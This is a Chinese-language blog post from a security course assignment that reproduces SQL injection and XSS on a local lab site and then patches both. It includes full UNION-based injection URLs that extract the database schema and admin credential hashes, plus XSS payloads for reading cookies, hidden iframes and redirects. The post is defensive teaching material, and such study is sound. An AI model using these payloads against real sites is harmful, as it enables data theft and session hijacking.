@@ -1,0 +1,920 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="web,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="混子pwn手来学点web的东西了，网络攻防课程要求做的作业 SQL注入原理 将SQL 代码插入或添加到应用（用户）的输入参数中，之后再讲这些参数传递给后台的 SQL 服务器加以解析并执行的攻击。   形成原因：  web开发人员没有在将从web表单、cookie、输入参数等收到的值传给SQL查询前进行检查  漏洞复现平台 ：    NPMserv    目标：NPMserv 中的一个政府网站">
+<meta name="keywords" content="web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入和XSS的简单学习笔记">
+<meta property="og:url" content="http://yoursite.com/2018/11/13/2018-11-13-SQL注入和XSS的简单学习笔记/index.html">
+<meta property="og:site_name" content="zs0zrc">
+<meta property="og:description" content="混子pwn手来学点web的东西了，网络攻防课程要求做的作业 SQL注入原理 将SQL 代码插入或添加到应用（用户）的输入参数中，之后再讲这些参数传递给后台的 SQL 服务器加以解析并执行的攻击。   形成原因：  web开发人员没有在将从web表单、cookie、输入参数等收到的值传给SQL查询前进行检查  漏洞复现平台 ：    NPMserv    目标：NPMserv 中的一个政府网站">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/picture/1542073321119.png">
+<meta property="og:image" content="http://yoursite.com/picture/1542073362556.png">
+<meta property="og:image" content="http://yoursite.com/picture/1542073876899.png">
+<meta property="og:image" content="http://yoursite.com/picture/1542074876497.png">
+<meta property="og:image" content="http://yoursite.com/picture/1542074933958.png">
+<meta property="og:image" content="http://yoursite.com/picture/1542077529335.png">
+<meta property="og:image" content="http://yoursite.com/picture/1542077648754.png">
+<meta property="og:image" content="http://yoursite.com/picture/1542077747888.png">
+<meta property="og:image" content="http://yoursite.com/picture/1542079746200.png">
+<meta property="og:image" content="http://yoursite.com/picture/1542079882350.png">
+<meta property="og:image" content="http://yoursite.com/picture/1542079914811.png">
+<meta property="og:image" content="http://yoursite.com/picture/1542080135130.png">
+<meta property="og:image" content="http://yoursite.com/picture/1542080095858.png">
+<meta property="og:image" content="http://yoursite.com/picture/1542080395672.png">
+<meta property="og:image" content="http://yoursite.com/picture/1542080657918.png">
+<meta property="og:image" content="http://yoursite.com/picture/1542087079685.png">
+<meta property="og:image" content="http://yoursite.com/picture/1542087470588.png">
+<meta property="og:image" content="http://yoursite.com/picture/1542087328193.png">
+<meta property="og:image" content="http://yoursite.com/picture/1542087524039.png">
+<meta property="og:image" content="http://yoursite.com/picture/1542087858116.png">
+<meta property="og:image" content="http://yoursite.com/picture/1542087956360.png">
+<meta property="og:image" content="http://yoursite.com/picture/1542089636750.png">
+<meta property="og:updated_time" content="2019-01-02T08:09:41.376Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SQL注入和XSS的简单学习笔记">
+<meta name="twitter:description" content="混子pwn手来学点web的东西了，网络攻防课程要求做的作业 SQL注入原理 将SQL 代码插入或添加到应用（用户）的输入参数中，之后再讲这些参数传递给后台的 SQL 服务器加以解析并执行的攻击。   形成原因：  web开发人员没有在将从web表单、cookie、输入参数等收到的值传给SQL查询前进行检查  漏洞复现平台 ：    NPMserv    目标：NPMserv 中的一个政府网站">
+<meta name="twitter:image" content="http://yoursite.com/picture/1542073321119.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/11/13/2018-11-13-SQL注入和XSS的简单学习笔记/">
+
+
+
+
+
+  <title>SQL注入和XSS的简单学习笔记 | zs0zrc</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">zs0zrc</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/13/2018-11-13-SQL注入和XSS的简单学习笔记/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="zs0zrc">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zs0zrc">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SQL注入和XSS的简单学习笔记</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-13T09:10:05+08:00">
+                2018-11-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/11/13/2018-11-13-SQL注入和XSS的简单学习笔记/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2018/11/13/2018-11-13-SQL注入和XSS的简单学习笔记/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>混子pwn手来学点web的东西了，网络攻防课程要求做的作业</p>
+<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><blockquote>
+<p>将SQL 代码插入或添加到应用（用户）的输入参数中，之后再讲这些参数传递给后台的 SQL 服务器加以解析并执行的攻击。 </p>
+</blockquote>
+<p>形成原因：</p>
+<blockquote>
+<p>web开发人员没有在将从web表单、cookie、输入参数等收到的值传给SQL查询前进行检查</p>
+</blockquote>
+<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>平台 ：    NPMserv    目标：NPMserv 中的一个政府网站   (本地搭的一个环境)</p>
+<p><img src="/picture/1542073321119.png" alt="1542073321119"></p>
+<ol>
+<li><p>判断注入点</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/info_show.php?info_id=140 and 1=1		有回显</span><br><span class="line">http://127.0.0.1/info_show.php?info_id=140 and 1=2		无回显</span><br></pre></td></tr></table></figure>
+<p><img src="/picture/1542073362556.png" alt="1542073362556"></p>
+</li>
+<li><p>爆破字段数量 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/info_show.php?info_id=140 order by 5</span><br><span class="line">这里数量，试了1到5都没问题，而6的话就会无回显，所以字段数量为5</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>判断可回显字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/info_show.php?info_id=140 union select 1,2,3,4,5</span><br><span class="line">这里发现只有2，3字段是可以回显的</span><br></pre></td></tr></table></figure>
+<p><img src="/picture/1542073876899.png" alt="1542073876899"></p>
+</li>
+<li><p>爆出敏感信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/info_show.php?info_id=140 union select 1,user(),database(),4,5</span><br><span class="line">爆出了数据库用户名和数据库名，分别为root@localhost 和  govcn</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/info_show.php?info_id=140 union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema=&quot;govcn&quot;</span><br><span class="line">爆出govcn数据库中包含的数据表，分别为admin，index_dy，index_info，index_intro，jgsz，ldjj</span><br><span class="line">group_concat函数用于把多条数据一次注出</span><br><span class="line"></span><br><span class="line">爆admin表的列名</span><br><span class="line">http://127.0.0.1/info_show.php?info_id=140 union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_name=&apos;admin&apos;</span><br><span class="line">爆出admin表中的列名为username,password</span><br><span class="line"></span><br><span class="line">爆用户和密码</span><br><span class="line">http://127.0.0.1/info_show.php?info_id=140 union select 1,unhex(hex(username)),unhex(hex(password)),4,5 from admin</span><br><span class="line">用unhex(hex())是为了解决网站编码不一致导致没有回显的问题</span><br><span class="line">用户名为admin，密码为：21232f297a57a5a743894a0e4a801fc3 这个是md5加密过的，拿去解密一下，解出来的内容为 admin。所以用户名为admin，密码为admin</span><br></pre></td></tr></table></figure>
+<p><img src="/picture/1542074876497.png" alt="1542074876497"></p>
+</li>
+</ol>
+<p>利用注出的用户密码成功登入后台</p>
+<p><img src="/picture/1542074933958.png" alt="1542074933958"></p>
+<p>至此，一个简单的SQL注入漏洞 就复现完了</p>
+<h4 id="SQL注入的防护手段"><a href="#SQL注入的防护手段" class="headerlink" title="SQL注入的防护手段"></a>SQL注入的防护手段</h4><blockquote>
+<p>1对客户端提交的数据进行严格的校验，校验可以考虑数据类型，字符长度或者正则表达式等方式。  </p>
+<p>2.对客户端提交的数据进行转义，例如将” ‘ “转义为” ‘ “。  </p>
+<p>3.采用预编译绑定变量的SQL语句而不是直接拼接SQL语句。  </p>
+<p>4.避免在生产环境中，直接输出错误信息，因为这些错误信息有可能被攻击者利用。  </p>
+<p>5.严格执行数据库账号权限管理。  </p>
+<p>6.对用户敏感信息特别是密码做严格加密处理。 </p>
+</blockquote>
+<h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>因为这个平台代码写的比较shi，本来想加上SQL预编译的，但是发现要改好多东西，所以就只针对漏洞点进行，修改。定位漏洞点，在info_show.php中</p>
+<p><img src="/picture/1542077529335.png" alt="1542077529335"></p>
+<p>可以发现它直接用GET请求获得的参数进行SQL查询，对传入的参数并没有进行检查。所以我在这加入了一个检查，判断传入的参数是否为数字，如果不为数字，就强制转换成数字。</p>
+<p><img src="/picture/1542077648754.png" alt="1542077648754"></p>
+<p>然后就ok了，补完洞了。再测试下，发现已经注入不了了。(也可能是我太菜了，才注不了，但是不管了，假装补上了)</p>
+<p><img src="/picture/1542077747888.png" alt="1542077747888"></p>
+<h3 id="XSS跨站脚本攻击"><a href="#XSS跨站脚本攻击" class="headerlink" title="XSS跨站脚本攻击"></a>XSS跨站脚本攻击</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><blockquote>
+<p>攻击者在被攻击的Web服务器网页中嵌入恶意脚本，通常是用JavaScript编写的恶意代码，当用户使用浏览器访问被嵌入恶意代码的网页时，恶意代码将会在用户的浏览器上执行。 </p>
+</blockquote>
+<h4 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h4><ol>
+<li><p>反射型 XSS</p>
+<blockquote>
+<p>反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。 </p>
+</blockquote>
+</li>
+<li><p>持久型 XSS</p>
+<blockquote>
+<p>此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。 </p>
+</blockquote>
+</li>
+<li><p>DOM XSS</p>
+<blockquote>
+<p>DOM-based XSS漏洞是基于文档对象模型Document Objeet Model 的一种漏洞。DOM是一个与平台、编程语言无关的借口，它允许程序或脚本动态的访问或者更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些事用户可以操作的.客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格的确认，就会产生DOM-based XSS漏洞。</p>
+</blockquote>
+</li>
+</ol>
+<h4 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>平台 ：    NPMserv    目标：NPMserv 中的博客网站   (本地搭的一个环境)</p>
+<p><img src="/picture/1542079746200.png" alt="1542079746200"></p>
+<p>寻找漏洞点，这些博客的网站，xss一般存在于留言板中。而这个博客系统中每篇文章下都可以留言，并且有留言本。</p>
+<p>先测试下文章的留言功能</p>
+<p><img src="/picture/1542079882350.png" alt="1542079882350"></p>
+<p>发现输入的js代码被执行了，所以这里存在一个xss漏洞，并且是个反射型的xss漏洞</p>
+<p><img src="/picture/1542079914811.png" alt="1542079914811"></p>
+<p>然后测试下留言本，很明显，这里也存在XSS漏洞，并且这个是个存储型的XSS漏洞，我输入的语句直接插入到网站上，只要用户访问了这个网站，那么我输入的代码就会被执行。</p>
+<p><img src="/picture/1542080135130.png" alt="1542080135130"></p>
+<p><img src="/picture/1542080095858.png" alt="1542080095858"></p>
+<p>这个可以拿来做很多事情，比如</p>
+<ol>
+<li>Cookie窃取</li>
+<li>会话劫持</li>
+<li>网页挂马</li>
+<li>DOS和DDOS</li>
+<li>XSS蠕虫</li>
+</ol>
+<p>简单演示下</p>
+<p>Cookie窃取</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/picture/1542080395672.png" alt="1542080395672"></p>
+<p>嵌入网页</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src= http://www.baidu.com width=400 height=300&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe src= http://www.baidu.com width=0 height=0 frameborder=0&gt;&lt;/iframe&gt;</span><br><span class="line">可以通过设置嵌入网页的高宽来隐藏它</span><br></pre></td></tr></table></figure>
+<p><img src="/picture/1542080657918.png" alt="1542080657918"></p>
+<p>页面跳转</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;location=&quot;http://www.baidu.com&quot;&lt;/script&gt;</span><br><span class="line">#直接劫持页面</span><br></pre></td></tr></table></figure>
+<h4 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h4><p>XSS攻击防御的核心思想就是对输入输出进行过滤和数据转义</p>
+<ol>
+<li><p>过滤：</p>
+<p>过滤不安全的标签，如script, style, link, iframe, frame。</p>
+<p>过滤字符串中的 反斜杠</p>
+</li>
+<li><p>转义</p>
+<p>针对&lt;、&gt;、/、’、”、&amp;五个字符进行实体化转义。 </p>
+</li>
+</ol>
+<p>文章评论漏洞</p>
+<p><img src="/picture/1542087079685.png" alt="1542087079685"></p>
+<p>漏洞修复：将$comment[‘content’] 的值经过htmlspecialchars函数处理，htmlspecialchars()函数可以把&amp; （和号）、“（双引号）、‘（单引号）、&lt;（小于）、&gt;（大于）这些敏感符号都转换为html实体。</p>
+<p><img src="/picture/1542087470588.png" alt="1542087470588"></p>
+<p>测试，XSS漏洞修复了</p>
+<p><img src="/picture/1542087328193.png" alt="1542087328193"></p>
+<p><img src="/picture/1542087524039.png" alt="1542087524039"></p>
+<p>留言版漏洞，这是一个存储型XSS漏洞，审查代码，定位漏洞点</p>
+<p><img src="/picture/1542087858116.png" alt="1542087858116"></p>
+<p>可以发现它对提交的变量没有进行过滤就插入数据库了</p>
+<p><img src="/picture/1542087956360.png" alt="1542087956360"></p>
+<p>漏洞修补：在add函数里加入htmlspecialchars函数，对传入的变量进行转义</p>
+<p><img src="/picture/1542089636750.png" alt="1542089636750"></p>
+<p>然后就搞定了，之前的XSS漏洞不可以用了</p>
+<p>reference：</p>
+<p><a href="https://zhuanlan.zhihu.com/p/37496782" target="_blank" rel="noopener">SQL注入攻击方式及防御方法，手把手入门白帽子 （二)</a></p>
+<p><a href="https://ctf-wiki.github.io/ctf-wiki/web/sqli/#_15" target="_blank" rel="noopener">CTF-Wiki</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/11/05/2018-11-5-arm-pwn环境搭建/" rel="next" title="arm-pwn环境搭建">
+                <i class="fa fa-chevron-left"></i> arm-pwn环境搭建
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/11/14/2018-11-14-SQL注入学习/" rel="prev" title="SQL注入学习">
+                SQL注入学习 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="zs0zrc">
+            
+              <p class="site-author-name" itemprop="name">zs0zrc</p>
+              <p class="site-description motion-element" itemprop="description">zs0zrc's blog</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">42</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://23r3f.github.io/" title="23R3F" target="_blank">23R3F</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://myhackerworld.top/" title="D4rk3r" target="_blank">D4rk3r</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://m4x.fun/" title="M4X" target="_blank">M4X</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL注入"><span class="nav-number">1.</span> <span class="nav-text">SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#原理"><span class="nav-number">1.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞复现"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL注入的防护手段"><span class="nav-number">1.3.</span> <span class="nav-text">SQL注入的防护手段</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞修复"><span class="nav-number">1.4.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS跨站脚本攻击"><span class="nav-number">2.</span> <span class="nav-text">XSS跨站脚本攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#原理-1"><span class="nav-number">2.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#类型"><span class="nav-number">2.2.</span> <span class="nav-text">类型</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞复现-1"><span class="nav-number">2.3.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#防御手段"><span class="nav-number">2.4.</span> <span class="nav-text">防御手段</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">zs0zrc</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: 'kXIhCtwOU5AsdKEH7mjI1f2k-gzGzoHsz',
+        appKey: 'uYeHUkgtbToPh4mGzE7YJXNe',
+        placeholder: 'pwn pwn pwn',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
